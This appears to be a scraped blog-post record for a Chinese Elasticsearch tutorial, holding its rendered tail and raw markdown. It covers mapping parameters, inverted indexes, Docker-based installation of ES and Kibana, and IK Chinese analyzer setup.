\n                \"first\\_name\": {  \n                    \"type\": \"text\",  \n                    \"copy\\_to\": \"full\\_name\"  \n                },  \n                \"last\\_name\": {  \n                    \"type\": \"text\",  \n                    \"copy\\_to\": \"full\\_name\"  \n                },  \n                \"full\\_name\": {  \n                    \"type\": \"text\"  \n                }  \n            }  \n        }  \n    }  \n}  \n  \nPUT my\\_index/my\\_type/1  \n{  \n    \"first\\_name\": \"John\",  \n    \"last\\_name\": \"Smith\"  \n}   \n//full\\_name = \\[\"John\",\"Smith\"\\]  \n\n\n\n```\n\n5.  **DOC\\_VALUES**\n\n\n为了加快排序、聚合操作，在建立倒排索引的时候，额外增加一个列式存储映射，是一个空间换时间的做法。 默认是开启的，对于确定不需要聚合或者排序的字段可以关闭。 注意：text类型没有doc\\_values。\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"status\\_code\": {  \n                    \"type\": \"keyword\"  \n                },  \n                \"session\\_id\": {  \n                    \"type\": \"keyword\",  \n                    \"doc\\_values\": false  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n6.  **ENABLED**\n\n\nenabled默认为true,将搜索所有字段。如果设置为false，该字段将不会被搜索。但仍会随着\\_source返回\n\n7.  **FIELDDATA**\n\n\n对非text类型的字段进行排序可以使用doc\\_value来进行加速。但是对于，text类型的字段，却不能进行分组排序。更何况加速。 下面这个异常展示了，对text类型的字段进行分组排序的错误。\n![](./2024/06/16/ES从入门到精通/27.png)\n但是可以通过设置fielddata值来达到这一目的。它将字段加载到内存中，因此第一次肯定会很慢。而且将占用内存。\n\n8.  **FORMAT**\n\n\n对字段进行格式化。\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"date\": {  \n                    \"type\": \"date\",  \n                    \"format\": \"yyyy-MM-dd\"  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n9.  **IGNORE\\_ABOVE**\n\n\n大小超过ignore\\_above设置的字符串不会被索引或存储。\n\n10.  FIELDS\n\n\n可以为一个字段映射多个数据类型。比如，一个字符串，可以映射为text，满足全文搜索。同时可以映射为keyword,满足分组和排序。 也可以使用多个分词器来对同一个字段进行分词。\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"city\": {  \n                    \"type\": \"text\",  \n                    \"fields\": {  \n                        \"raw\": {  \n                            \"type\": \"keyword\"  \n                        }  \n                    }  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n11.  **STORE**\n\n\n我们知道，source字段存储了原始数据(默认)。当然可以通过设置其属性值来选择不存储。此外，还可以通过store选择是否额外存储某个字段。store属性默认为no,表示不存储。当设置为yes时，会在source之 外独立存储。此时，搜索时，会绕过\\_source，单独进行一次IO得到该字段的值。 store会严重影响搜索效率，尽管如此，在以下两种情况下，还是可以选择使用：\n\n*   字段很长，每次检索\\_source代价很大。\n\n*   需要单独对某些字段进行索引重建。\n\n\n7.4 ES中常见数据类型\n-------------\n\n1.  **字符串**\n\n\n字符串在之前的版本主要指的是 string 类型。但是在5.X版本已经不支持 string 类型。其被 text 和keyword 类型替代\n\n2.  **text**\n\n\ntext字段需要被全文搜索的内容，它可以保存非常长的内容。查询的时候一般使用分词器器进⾏行行分词然后进行全文搜索。text类型的字段不用于排序，很少用于聚合。 （text类型的数据被用来索引长文本，例如电子邮件主体部分或者一款产品的介绍，这些文本会被分析，在建立索引文档之前会被分词器进行分词，转化为词组。经过分词机制之后es允许检索到该文本切分而成的词语，但是text类型的数据不能用来过滤、排序和聚合等操作。\n\n3.  **keyword**\n\n\n此字段不能使用分词器进行查询，只能搜索该字段的完整的值。所以其主要保存一些可以索引的结构化内容。此字段可以进行排序、聚合等操作。 keyword类型的数据可以满足电子邮箱地址、主机名、状态码、邮政编码和标签等数据的要求，不进行分词，常常被用来过滤、排序和聚合。 综上，可以发现text类型在存储数据的时候会默认进行分词，并生成索引。而keyword存储数据的时候，不会分词建立索引，显然，这样划分数据更加节省内存。）\n\n8 底层知识：正排索引和倒排索引底层原理\n====================\n\n8.1 什么是正排索引\n-----------\n\n正排索引是按照文档编号或文档ID等有序的方式将每个文档存储在索引中，通过文档编号或ID进行检索。\n\n这种方式类似于数据库表的行，可以很方便地根据文档ID检索到具体的文档，但是不适合处理大规模文档库的情况。\n\n比如mysql的b+锁索引结构\n![](./2024/06/16/ES从入门到精通/28.png)\n比如书籍目录，可以根据页码找文档内容，就是正排索引\n![](./2024/06/16/ES从入门到精通/29.png)\n8.2 什么是倒排索引\n-----------\n\n倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map< item, list< id>>，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。\n![](./2024/06/16/ES从入门到精通/30.png)\n比如书籍索引页根据关键词，找页码就是倒排索引\n![](./2024/06/16/ES从入门到精通/31.png)\n8.3 ES如何做到快速索引\n--------------\n\n假设有这么几条数据\n\n```\n\n\n| ID | Name | Age | Sex |  \n| -- |:------------:| -----:| -----:|  \n| 1 | Kate | 24 | Female  \n| 2 | John | 24 | Male  \n| 3 | Bill | 29 | Male  \n\n\n\n```\n\nID是Elasticsearch自建的文档id，那么Elasticsearch建立的索引如下: Name：\n\n```\n\n\n| Term | Posting List |  \n| -- |:----:|  \n| Kate | 1 |  \n| John | 2 |  \n| Bill | 3 |  \n\n\n\n```\n\nAge：\n\n```\n\n\n| Term | Posting List |  \n| -- |:----:|  \n| 24 | \\[1,2\\] |  \n| 29 | 3 |  \n\n\n\n```\n\n### 8.3.1 Posting List\n\nElasticsearch分别为每个field都建立了一个倒排索引，\n\n*   Kate, John, 24, Female这些叫term，\n\n*   而\\[1,2\\]就是Posting List。\n\n\nPosting list就是一个int的数组，存储了所有符合某个term的文档id。 根据id查找的话，通过posting list这种索引方式似乎可以很快进行查找，比如要找age=24的同学，在id数组中查找即可。二分查找，但是，如果想通过name来查找呢？\n\n### 8.3.2 Term Dictionary\n\nElasticsearch为了能快速找到某个term，将所有的term排个序，二分法查找term，logN的查找效， 就像通过字典查找一样. 这样我们可以用二分查找的方式，比全遍历更快地找出目标的term。 这个就是 term dictionary。 所以：反向索引分成两部分，如下图(来自《信息检索导论》)：\n![](./2024/06/16/ES从入门到精通/32.png)\n左面是词项词典(Term Dictionary)，右边是倒排记录表(Posting)。 在Lucene中，词典和倒排是分开存储的，词典存储在.tii和.tis文件中。 而倒排又分为两部分存储，第一部分是文档号和词频信息，存储在.frq中；另一部分是词的位置信息， 存储在.prx文件中。 有了term dictionary之后，可以用 logN 次磁盘查找得到目标。 问题是：现在再看起来，似乎和传统数据库通过B+Tree的方式类似啊，为什么说比B+Tree的查询快？\n\n### 8.3.3 Term Index\n\nB-Tree通过**减少磁盘寻道次数**来提高查询性能，Elasticsearch也是采用同样的思路\n\n但是磁盘的随机读操作仍然是非常昂贵的（一次random access大概需要10ms的时间）。\n\n所以尽量少的读磁盘，有必要把一些数据缓存到内存里。**Elasticsearch直接通过内存查找term，不读磁盘**\n\n但是整个term dictionary本身又太大了，无法完整地放到内存里。\n\n于是就有了term index。term index有点像一本字典的大的章节表，或者说，像一本书的目录。\n\n比如：\n\n```\n\n\nA开头的term ……………. Xxx页  \nC开头的term ……………. Xxx页  \nE开头的term ……………. Xxx页  \n\n\n\n```\n\n如果所有的term都是英文字符的话，可能这个term index就真的是26个英文字符表构成的了。 但是实际的情况是，term未必都是英文字符，term可以是任意的byte数组。\n\n而且26个英文字符也未必是每一个字符都有均等的term，比如x字符开头的term可能一个都没有，而s开头的term又特别多。\n\n实际的term index，的内部结构，类似一棵 trie 树：\n![](./2024/06/16/ES从入门到精通/33.png)\n例子是一个包含 “A”, “to”, “tea”, “ted”, “ten”, “i”, “in”, 和 “inn” 的 trie 树。 Term Dictionary与Term Index存储，Term Dictionary文件的后缀名为tim，Term Index文件的后缀名是tip。\n\n> Lucene为词典做了一层前缀索引(Term Index)，这个索引在Lucene4.0以后采用的数据结构是FST (Finite State Transducer)，一种前缀树的变种，可以称之为前缀索引。\n\n这种数据结构占用空间很小，Lucene打开索引的时候将其全量装载到内存中，加快磁盘上词典查询速度的同时减少随机磁盘访问次数。\n\n### 8.3.4 Trie树（前缀树，字典树）\n\nTrie，又经常叫前缀树，字典树等等。\n\n*   一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。\n\n*   一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。\n\n\ntrie中的键通常是字符串，但也可以是其它的结构。它有很多变种，如后缀树，Radix Tree/Trie，PATRICIA tree，以及bitwise版本的crit-bit tree。\n\n当然很多名字的意义其实有交叉。 在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字 符串。\n\n与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。\n\ntrie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。\n\n这棵树不会包含所有的 term，它包含的是 term 的一些前缀。\n\n通过 term index 可以快速地定位到 term dictionary 的某个 offset，然后从这个位置再往后顺序查找。\n\n再加上一些压缩技术（搜索 Lucene Finite State Transducers）, term index 的尺寸可以只有所有term 的尺寸的**几十分之一**，使得用内存缓存整个 term index 变成可能。整体上来说就是这样的效果：\n![](./2024/06/16/ES从入门到精通/34.png)\n### 8.3.5 为什么ES检索比Mysql快\n\n现在我们可以回答**“为什么 Elasticsearch/Lucene 检索可以比 Mysql 快”** 了。 Mysql 只有 term dictionary 这一层，是以 b+tree 排序的方式存储在磁盘上的。\n\n检索一个 term 需要若干次（1-3次）的 random access 的磁盘操作。\n\n而ES/ Lucene 在 term dictionary 的基础上添加了 term index 来加速检索，term index 以类似前缀树的形式缓存在内存中。 从 term index 查到对应的 term dictionary 的 block 位置之后，再去磁盘上找 term，大大减少了磁盘的 random access 次数, 将3次 变成了1次。\n\n\n","source":"_posts/ES从入门到精通.md","raw":"---\ntitle: ES从入门到精通\ndate: 2024-06-16 18:47:07\ntags: ElasticSearch入门\ncategories: 面试\n---\n\nElasticSearch 从入门到工业级使用\n=======================\n\n1.1 什么是全文检索\n-----------\n\n将非结构化数据中的一部分信息提取出来，重新组织，使其变得有一定结构，然后对此有一定结构的数据进行搜索，从而达到搜索相对较快的目的。这部分从非结构化数据中提取出的然后重新组织的信息，我们称之索引。\n\n例如：字典。字典的拼音表和部首检字表就相当于字典的索引，对每一个字的解释是非结构化的，如果字典没有音节表和部首检字表，在茫茫辞海中找一个字只能顺序扫描。\n\n然而字的某些信息可以提取出来进行结构化处理，比如读音，就比较结构化，分声母和韵母，分别只有几种可以一一列举，于是将读音拿出来按一定的顺序排列，每一项读音都指向此字的详细解释的页数。\n\n我们搜索时按结构化的拼音搜到读音，然后按其指向的页数，便可找到我们的非结构化数据——也即对字的解释。 这种先建立索引，再对索引进行搜索的过程就叫全文检索(Full-text Search)。\n\n虽然创建索引的过程也是非常耗时的，但是索引一旦创建就可以多次使用，全文检索主要处理的是查询，所以耗时间创建索引是值得的。\n![](./2024/06/16/ES从入门到精通/1.png)\n比如使用全文检索，所搜索“生化机”\n![](./2024/06/16/ES从入门到精通/2.png)\n（有可能是手抖打错了，本来是生化危机），但是期望需要出来右侧的 4条 记录\n\n有 4条 数据将每条数据进行词条拆分。\n\n如“生化危机电影”拆成：生化、危机、电影 关键词（拆分结果与策略算法有关）每个关键词将对应包含此关键词的数据 ID搜索的时候，直接匹配这些关键词，就能拿到包含关键词的数据这个过程就叫做全文检索。\n\n而词条拆分和词条对应的 ID 这个就是倒排索引的的基本原理\n\n**对比数据库的缺陷**\n\nmysql如果没有索引的情况下，共有100万条,按照之前的思路,其实就要扫描100万次，而且每次扫描,都需要匹配那个文本所有的字符，确认是否包含搜索的关键词，而且还不能将搜索词拆解开来进行检索\n![](./2024/06/16/ES从入门到精通/3.png)\n**全文检索使用场景**\n\n*   维基百科，类似百度百科，牙膏，牙膏的维基百科，全文检索，高亮，搜索推荐\n\n*   The Guardian（国外新闻网站），类似搜狐新闻，用户行为日志（点击，浏览，收藏，评论）+社交网络数据（对某某新闻的相关看法），数据分析，给到每篇新闻文章的作者，让他知道他的文章的公众反馈（好，坏，热门，垃圾，鄙视，崇拜）\n\n*   Stack Overflow（国外的程序异常讨论论坛），IT问题，程序的报错，提交上去，有人会跟你讨论和回答，全文检索，搜索相关问题和答案，程序报错了，就会将报错信息粘贴到里面去，搜索有没有对应的答案\n\n*   GitHub（开源代码管理），搜索上千亿行代码（5）电商网站，检索商品\n\n*   日志数据分析，logstash采集日志，ES进行复杂的数据分析（ELK技术，elasticsearch+logstash+kibana）\n\n*   商品价格监控网站，用户设定某商品的价格阈值，当低于该阈值的时候，发送通知消息给用户，比如说订阅牙膏的监控，如果高露洁牙膏的家庭套装低于50块钱，就通知我，我就去买\n\n*   BI系统，商业智能，Business Intelligence。比如说有个大型商场集团，BI，分析一下某某区域最近3年的用户消费金额的趋势以及用户群体的组成构成，产出相关的数张报表，\\*\\*区，最近3年，每年消费金额呈现100%的增长，而且用户群体85%是高级白领，开一个新商场。ES执行数据分析和挖掘，Kibana进行数据可视化\n\n\n1.2 ES简介\n--------\n\nElaticsearch，简称为es， es是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。\n\nes也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。\n\nElasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。\n\n在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。Elasticsearch比传统关系型数据库如下：\n\n```\n\n\nRelational DB -> Databases -> Tables -> Rows -> Columns  \nElasticsearch -> Indices   -> Types  -> Documents -> Fields  \n\n\n\n```\n\nElasticsearch提供多种语言支持，其中Java的客户端为 Java REST Client 。\n\n而它又分成两种：高级和低级的。高级包含更多的功能，如果把高级比作MyBatis的话，那么低级就相当于JDBC，是基于Netty和Server通讯相关。\n\n高级的 Client类似Mybatis是对于Low Level的封装。\n![](./2024/06/16/ES从入门到精通/4.png)\n1.3 ES基本概念\n----------\n\n1.  **索引库**\n\n\nElasticSearch将它的数据存储在一个或多个索引（index）中。\n\n用SQL领域的术语来类比，索引就像数据库，可以向索引写入文档或者从索引中读取文档，并通过ElasticSearch内部使用Lucene将数据写入索引或从索引中检索数据。\n\nElastic Search使用倒排索引（Inverted Index）来做快速的全文搜索，这点与数据库不同，一般数据库 的索引，用B+Tree来实现。\n\n| **Relational DB** | **Databases** | **Tables** | **表结构** | **Rows** | **Columns** |\n| --- | --- | --- | --- | --- | --- |\n|ElasticSearch| Indices| Types| 映射mapping| Documents| Fields 字段|\n\n索引库就是存储索引的保存在磁盘上的一系列的文件。里面存储了建立好的索引信息以及文档对象。一个索引库相当于数据库中的一张表。\n![](./2024/06/16/ES从入门到精通/5.png)\n2.  **document对象**\n\n\n获取原始内容的目的是为了索引，在索引前需要将原始内容创建成文档（Document），文档中包括一个一个的域（Field），域中存储内容。\n\n每个文档都有一个唯一的编号，就是文档id。\n\ndocument对象相当于表中的一条记录。\n\n文档（document）是ElasticSearch中的主要实体。\n\n对所有使用ElasticSearch的案例来说，他们最终都可以归结为对文档的搜索。\n\n文档由字段构成。\n\n![](./2024/06/16/ES从入门到精通/6.png)\n3.  **field对象**\n\n\n如果我们把document看做是数据库中一条记录的话，field相当于是记录中的字段。field是索引库中存储数据的最小单位。field的数据类型大致可以分为数值类型和文本类型，一般需要查询的字段都是文本类型的，field的还有如下属性：\n\n*   是否分词：是否对域的内容进行分词处理。前提是我们要对域的内容进行查询。\n\n*   是否索引：将Field分析后的词或整个Field值进行索引，只有索引方可搜索到。比如：商品名称、商品简介分析后进行索引，订单号、身份证号不用分词但也要索引，这些将来都要作为查询条件。\n\n*   是否存储：将Field值存储在文档中，存储在文档中的Field才可以从Document中获取。比如：商品名称、订单号，凡是将来要从Document中获取的Field都要存储。\n\n\n4.  **term对象**\n\n\n从文档对象中拆分出来的每个单词叫做一个Term，不同的域中拆分出来的相同的单词是不同的term。\n\nterm中包含两部分一部分是文档的域名，另一部分是单词的内容。\n\nterm是创建索引的关键词对象。\n\n8.  **类型（type）**\n\n\n每个文档都有与之对应的类型（type）定义。\n\n这允许用户在一个索引中存储多种文档类型，并为不同文 档提供类型提供不同的映射。 type的版本迭代\n\n*   5.x及以前版本一个index有一个或者多个type\n\n*   6.X版本一个index只有一个index\n\n*   7.X版本移除了type，type相关的所有内容全部变成Deprecated，为了兼容升级和过渡，所有的7.X版本es数据写入后type字段都默认被置为\\_doc\n\n*   8.X版本完全废弃type\n\n\n9.  **映射（mapping）**\n\n\nmapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。\n\n10.  **分片（shards）**\n\n\n代表索引分片，es可以把一个完整的索引分成多个分片，这样的好处是可以把一个大的索引拆分成多个，分布到不同的节点上。构成分布式搜索。分片的数量只能在索引创建前指定，并且索引创建后不能更改。\n\n5.X默认不能通过配置文件定义分片 ES默认5:1 5个主分片，每个分片，1个副本分片\n\n11.  **副本（replicas）**\n\n\n代表索引副本，es可以设置多个索引的副本，副本的作用：\n\n*   提高系统的容错性，当个某个节点某个分片损坏或丢失时可以从副本中恢复。\n\n*   是提高es的查询效率，es会自动对搜索请求进行负载均衡。\n\n\n12.  **集群（cluster）**\n\n\n代表一个集群，集群中有多个节点（node），其中有一个为主节点，这个主节点是可以通过选举产生的，主从节点是对于集群内部来说的。es的一个概念就是去中心化，字面上理解就是无中心节点，这是对于集群外部来说的，因为从外部来看es集群，在逻辑上是个整体，你与任何一个节点的通信和与整个es集群通信是等价的。\n\n2 安装和DSL的使用\n===========\n\n2.1 安装ES\n--------\n\n使用docker安装单点Elasticsearch，步骤如下：\n\n```\n\n\ndocker network create elastic  \ndocker pull docker.elastic.co/elasticsearch/elasticsearch:7.15.2  \ndocker run -di --name es --net elastic -p 192.168.56.181:9200:9200 -p 192.168.56.181:9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:7.15.2  \n\n\n\n```\n\n9200端口(Web管理平台端口)  9300(服务默认端口)\n\n浏览器输入地址访问：`http://192.168.56.181:9200/`\n\n![](./2024/06/16/ES从入门到精通/7.png)\n3.  **系统参数配置**\n\n\nes发现重启启动失败了，这时什么原因呢？\n\n这与我们刚才修改的配置有关，因为elasticsearch在启动的时候会进行一些检查，比如最多打开的文件的个数以及虚拟内存区域数量等等，如果你放开了此配置，意味着需要打开更多的文件以及虚拟内存，所以我们还需要系统调优 修改vi /etc/security/limits.conf ，追加内容 (nofile是单个进程允许打开的最大文件个数 soft nofile 是软限制 hard nofile是硬限制 )\n\n```\n\n\n\\* soft nofile 65536  \n\\* hard nofile 65536  \n\n\n\n```\n\n修改vi /etc/sysctl.conf，追加内容 (限制一个进程可以拥有的VMA(虚拟内存区域)的数量 )\n\n```\n\n\nvm.max\\_map\\_count\\=655360  \n\n\n\n```\n\n执行下面命令 修改内核参数马上生效\n\n```\n\n\nsysctl \\-p  \n\n\n\n```\n\n重新启动虚拟机，再次启动容器，发现已经可以启动并远程访问\n\n```\n\n\nreboot  \n\n\n\n```\n\n2.2 安装Kibana\n------------\n\nKibana是一个针对Elasticsearch的开源分析及可视化平台，用来搜索、查看交互存储在Elasticsearch索引中的数据。使用Kibana，可以通过各种图表进行高级数据分析及展示。\n\nKibana让海量数据更容易理解。它操作简单，基于浏览器的用户界面可以快速创建仪表板（dashboard）实时显示Elasticsearch查询动态。\n\n设置Kibana非常简单。\n\n无需编码或者额外的基础架构，几分钟内就可以完成Kibana安装并启动Elasticsearch索引监测。\n\nQuery DSL是一个Java开源框架用于构建类型安全的SQL查询语句。\n\n采用API代替传统的拼接字符串来构造查询语句。\n\n目前QueryDSL支持的平台包括JPA，JDO，SQL，Java Collections，RDF，Lucene，Hibernate Search。elasticsearch提供了一整套基于JSON的DSL语言来定义查询。\n\n```\n\n\ndocker pull docker.elastic.co/kibana/kibana:7.15.2  \ndocker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e \"ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200\" docker.elastic.co/kibana/kibana:7.15.2  \n\n\n\n```\n\n1.  拉取kibana镜像\n\n\n```\n\n\ndocker pull docker.elastic.co/kibana/kibana:7.15.2  \n\n\n\n```\n\n2.  安装kibana容器\n\n\n```\n\n\ndocker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e \"ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200\" docker.elastic.co/kibana/kibana:7.15.2  \n\n\n\n```\n\n3.  修改配置文件\n\n\n```\n\n\ndocker exec -it kb /bin/bash  \nvi config/kibana.yml  \n\n\n\n```\n\n好像不改也可以，因为上面docker启动有了ES地址\n\n```\n\n\n#修改elasticsarch.hosts: \\[ \"http://elasticsearch:9200\" \\]，如下：  \nelasticsearch.hosts: \\[ \"http://192.168.56.181:9200\" \\]  \n\n\n\n```\n\n2.3通过脚本一键启动ES\n-------------\n\n通过提供的脚本，和配置文件，可以一键启动ES\n\n这个非常的容易，非常的轻量级。 具体请参见视频。\n\n![](./2024/06/16/ES从入门到精通/8.png)\n启动完之后的效果\n\n![](./2024/06/16/ES从入门到精通/9.png)\n接下来，可以访问es\n\nhttp://cdh1:9200\n\n![](./2024/06/16/ES从入门到精通/10.png)\n接下来，可以访问 Kibana\n\n```\n\n\n默认的地址     http://cdh1:5601               \n  \n的一键环境地址     http://cdh1:5601             \n\n\n```\n\n![](./2024/06/16/ES从入门到精通/11.png)\n2.4使用 DSL 操作ES\n--------------\n\n在 Kibana的开发工具界面，可以执行 DSL 去进行ES的查询。\n\n![](./2024/06/16/ES从入门到精通/12.png)\nes开发，常常需要用到DSL语法去定义好 es的查询语句。\n\n就像 myql开发，需要提前定义好 sql语句，并进行sql 的执行和测试一样。\n\n### 2.4.1DSL 定义基本介绍\n\n##### DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\n\n在Elasticsearch中，可用DSL语法来定义查询和过滤条件，以及执行聚合操作。\n\nDSL语法 具有JSON格式，因此它非常易于阅读和编写。\n\n### 2.4.2DSL 定义语法说明\n\n###### （1）关键字(Keywords)\n\n*   DSL通常会定义一组关键字，这些关键字具有特殊含义，并在DSL中起到关键作用。关键字通常不能用作标识符或变量名。\n\n*   示例：在一个简单的数学表达式DSL中，可能会定义关键字如\"add\"、\"subtract\"等来表示加法和减法操作。\n\n\n###### （2）标识符(Identifiers)\n\n*   标识符是用来表示变量名、函数名或其他用户定义的名称。它们需要遵循特定的命名规则，如大小写敏感、不包含特殊字符等。\n\n*   示例：在一个配置文件DSL中，可以使用标识符来表示不同的配置项，如\"username\"、\"password\"等。\n\n\n###### （3）表达式(Expressions)\n\n*   表达式是DSL中最基本的构建块，用于计算或产生某个值。表达式可以包括变量、常量、运算符和函数调用。\n\n*   示例：在一个数学表达式DSL中，可以将\"2 + 3\"作为一个表达式，计算结果为5。\n\n\n###### （4）运算符(Operators)\n\n*   运算符用于执行各种操作，例如算术运算、逻辑运算、比较运算等。DSL中的运算符根据所涉及的领域和需求而定。\n\n*   示例：在一个布尔表达式DSL中，可以定义逻辑运算符如\"and\"、\"or\"用于连接多个条件。\n\n\n###### （5）函数调用(Function Calls)\n\n*   DSL可以支持函数调用，允许用户使用预定义或自定义的函数来完成特定的任务。函数调用通常由函数名称和传递给函数的参数组成。\n\n*   示例：在一个日期处理DSL中，可以定义函数\"formatDate(date, format)\"，其中\"date\"是日期值，\"format\"是日期格式字符串。\n\n\n###### （6）控制流(Control Flow)\n\n*   控制流语句用于控制程序的执行流程，例如条件语句(if-else)和循环语句(while、for)等。DSL可以支持特定的控制流语句来满足领域特定需求。\n\n*   示例：在一个工作流程DSL中，可以使用条件语句来判断某个条件是否满足并执行相应的操作。\n\n\n###### （7）注释(Comments)\n\n*   注释用于向DSL代码添加说明性文本，以便开发人员理解和维护代码。注释通常不会被编译或执行，仅用于阅读目的。\n\n*   示例：在DSL中，可以使用双斜杠(//)或特定的注释标记来添加注释，如：“// 这是一个示例注释”。\n\n\n### 2.4.3DSL常见语法\n\n> 文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》\n\n3 ES 的分词器\n=========\n\n3.1 倒排索引\n--------\n\n![](./2024/06/16/ES从入门到精通/13.png)\n如上图\n\n*   左边的是正排索引，通过文档的id如查找文档的内容\n\n*   右边的是倒排索引，通过单词统计次数以及文档的位置，\n\n\n如Elasticsearch出现的次数为3，在id=1，id=2，id=3都出现过，且位置分别为1，0，0\n\n3.2 默认分词器\n---------\n\n默认分词器对于英文分词的效果如下\n\n```\n\n\nPOST /\\_analyze  \n{  \n  \"text\": \"You can use Elasticsearch to store, search, and manage data\",  \n  \"analyzer\": \"standard\"  \n}  \n  \n  \n\n\n\n```\n\n结果如下：\n![](./2024/06/16/ES从入门到精通/14.png)\n```\n\n\nPOST /\\_analyze  \n{  \n  \"text\": \"中华人民共和国人民大会堂\",  \n  \"analyzer\": \"standard\"  \n}  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/15.png)\n3.3 中文分词\n--------\n\n中文分词是中文文本处理的一个基础步骤，也是中文人机自然语言交互的基础模块。\n\n不同于英文的是，中文句子中没有词的界限，因此在进行中文自然语言处理时，通常需要先进行分词，\n\n分词效果将直接影响词性、句法树等模块的效果。\n\n当然分词只是一个工具，场景不同，要求也不同。\n\n部分分词工具如下：\n\n*   中科院计算所NLPIR http://ictclas.nlpir.org/nlpir/\n\n*   ansj分词器 https://github.com/NLPchina/ansj\\_seg\n\n*   哈工大的LTP https://github.com/HIT-SCIR/ltp\n\n*   清华大学THULAC https://github.com/thunlp/THULAC\n\n*   斯坦福分词器 https://nlp.stanford.edu/software/segmenter.shtml\n\n*   Hanlp分词器 https://github.com/hankcs/HanLP\n\n*   结巴分词 https://github.com/yanyiwu/cppjieba\n\n*   KCWS分词器(字嵌入+Bi-LSTM+CRF) https://github.com/koth/kcws\n\n*   ZPar https://github.com/frcchang/zpar/releases\n\n*   IKAnalyzer https://github.com/wks/ik-analyzer\n\n\n3.4 IK分词器\n---------\n\nIK分词器下载地址https://github.com/medcl/elasticsearch-analysis-ik/releases 将ik分词器上传到服务器上，然后解压，并改名字为ik\n\n```\n\n\nmkdir ~/ik  \nmv elasticsearch-analysis-ik-7.15.2.zip ~/ik  \nunzip elasticsearch-analysis-ik-7.15.2.zip  \n\n\n\n```\n\n将ik目录拷贝到docker容器的plugins目录下\n\n```\n\n\ndocker cp ./ik es:/usr/share/elasticsearch/plugins  \n\n\n\n```\n\n> 特别说明，的一键启动版本，已经默认戴上了IK分词器\n\nIKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包，IK分词器分为两种模式\n\n1.  **ik\\_max\\_word：会将文本做最细粒度的拆分**\n\n\n比如会将“中华人民共和国人民大会堂”拆分为“中华人民共和国、中华人民、中华、华人、人民共和国、人民、共和国、大会堂、大会、会堂等词语。\n\n```\n\n\nPOST /\\_analyze  \n{  \n\"text\":\"中华人民共和国人民大会堂\",  \n\"analyzer\":\"ik\\_max\\_word\"  \n}  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/16.png)\n2.  **ik\\_smart：会做最粗粒度的拆分**\n\n\n比如会将“中华人民共和国人民大会堂”拆分为中华人民共和国、人民大会堂。\n\n```\n\n\nPOST /\\_analyze  \n{  \n  \"text\": \"中华人民共和国人民大会堂\",  \n  \"analyzer\": \"ik\\_smart\"  \n}  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/17.png)\n3.5 自定义扩展字典\n-----------\n\nIK分词器的两种模式的最佳实践是：索引时用ik\\_max\\_word，搜索时用ik\\_smart，索引时最大化的将文章内容分词，搜索时更精确的搜索到想要的结果。\n\n举个例子：用户输入“华为手机”搜索，此时应该搜索出“华为手机”的商品，而不是“华为”和“手机”这两个词，这样会搜索出华为其它的商品，\n\n此时使用ik\\_smart和ik\\_max\\_word都会将华为手机拆分为华为和手机两个词，那些只包括“华为”这个词的信息也被搜索出来了，我的目标是搜索只包含华为手机这个词的信息，这没有满足我的目标。\n\nik\\_smart默认情况下分词“华为手机”，依然会分成两个词“华为”和“手机”，这时需要使用自定义扩展字典\n\n1.  **进入es**\n\n\n```\n\n\ndocker exec -it es /bin/bash  \n\n\n\n```\n\n2.  **增加自定义字典文件**\n\n\n如果容器编辑乱码，可以在宿主机编辑，然后拷贝到容器中\n\n```\n\n\n#进入ik配置目录  \ncd plugins/ik/config/  \nvi new\\_word.dic  \n\n\n\n```\n\n内容如下：\n\n```\n\n\n老铁  \n王者荣耀  \n洪荒之力  \n共有产权房  \n一带一路  \njava日知录  \n华为手机  \n\n\n\n```\n\n3.  **修改配置文件**\n\n\n```\n\n\nvi IKAnalyzer.cfg.xml  \n\n\n\n```\n\n内容如下：\n\n```\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n<!DOCTYPE properties SYSTEM \"http://java.sun.com/dtd/properties.dtd\"\\>  \n<properties>  \n        <comment>IK Analyzer 扩展配置</comment>  \n       